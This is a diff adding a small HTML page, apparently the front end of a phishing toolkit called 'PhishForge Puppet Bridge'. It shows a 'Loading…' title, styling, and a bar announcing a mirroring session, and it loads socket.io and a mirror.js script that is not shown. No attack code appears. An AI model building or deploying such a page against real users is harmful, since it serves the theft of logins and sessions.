@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Loading…</title>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; background: #202124; color: #e8eaed; font-family: Roboto, Arial, sans-serif; }
+    #bar { padding: 8px 12px; background: #303134; font-size: 12px; border-bottom: 1px solid #3c4043; }
+    #mirror { min-height: calc(100vh - 36px); overflow: auto; }
+    #mirror iframe-like { display: block; width: 100%; }
+    .err { color: #f28b82; padding: 16px; }
+  </style>
+</head>
+<body>
+  <div id="bar">PhishForge Puppet Bridge — mirroring session</div>
+  <div id="mirror"></div>
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/mirror.js"></script>
+</body>
+</html>
